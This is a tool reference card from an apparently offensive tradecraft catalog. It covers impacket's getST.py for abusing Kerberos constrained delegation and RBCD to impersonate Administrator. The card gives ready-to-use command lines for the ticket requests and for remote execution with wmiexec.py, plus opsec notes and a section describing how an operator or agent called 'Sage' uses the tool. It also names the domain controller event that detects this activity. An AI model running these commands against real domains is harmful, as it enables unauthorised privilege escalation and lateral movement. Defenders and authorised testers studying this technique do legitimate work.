---
name: impacket-getST
category: kerberos
subcategories: [s4u2self, s4u2proxy, ticket-request, impersonation]
tradecraft_tags: [impacket, s4u, kerberos, python, service-ticket, impersonation]
mitre_attack:
  - id: T1558
    name: Steal or Forge Kerberos Tickets
source:
  url: https://github.com/fortra/impacket
  license: Apache-2.0
  maintained: true
binary_type: python-script
binary_filename: getST.py
supported_os: [linux]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  S4U2self + S4U2proxy ticket requests visible in DC Kerberos logs (Event 4769 with
  S4U flags). Same detection as Rubeus s4u command but from Linux infrastructure.
usage_examples:
  - description: S4U2self + S4U2proxy (constrained delegation abuse from Linux)
    args: "getST.py -spn cifs/TARGET.domain.local -impersonate Administrator -dc-ip 192.168.56.10 domain.local/delegating_user:Password123"
  - description: RBCD exploitation from Linux
    args: "getST.py -spn cifs/VICTIM.domain.local -impersonate Administrator -dc-ip 192.168.56.10 domain.local/mypc01:P@ssw0rd1!"
  - description: Use resulting ticket with impacket
    args: "KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass domain.local/Administrator@VICTIM"
opsec_notes: |
  Python/Linux equivalent of Rubeus s4u command. For Apollo-based operations, Rubeus
  is preferred. getST.py is the Linux-side S4U chain executor for RBCD and constrained
  delegation exploitation when operating from infrastructure.
gotchas: |
  Python-only — not Apollo-runnable. Produces a ccache file. Requires impacket.
  Set KRB5CCNAME environment variable to use the ticket with other impacket tools.
related_ttps: [rubeus, standin, krbrelay, certify]
alternatives: [rubeus-s4u, kekeo]
common_args:
  -spn:
    description: Target SPN for S4U2proxy
    typical_values: ["cifs/TARGET.domain.local"]
    required: true
  -impersonate:
    description: User to impersonate
    typical_values: ["Administrator"]
    required: true
  -dc-ip:
    description: Domain controller IP
    typical_values: ["192.168.56.10"]
  target:
    description: DOMAIN/user:password for the delegating account
    typical_values: ["domain.local/delegating_user:Password123"]
    required: true
last_updated: 2026-05-29
---

# impacket-getST

impacket's `getST.py` — Python-side S4U2self + S4U2proxy ticket request for constrained
delegation and RBCD exploitation. The Linux equivalent of Rubeus `s4u`. Given credentials
for an account configured for constrained delegation (or an RBCD-configured account),
getST.py requests a service ticket impersonating any specified user to the target service.

## Typical use cases
- Constrained delegation or RBCD exploitation from Linux infrastructure
- S4U chain execution when Rubeus isn't available (Linux-only attack chain)

## How Sage uses this
Infrastructure-side Python tool. Rubeus is preferred for Windows-side S4U operations.
getST.py is documented for completeness in Linux-based attack chains.
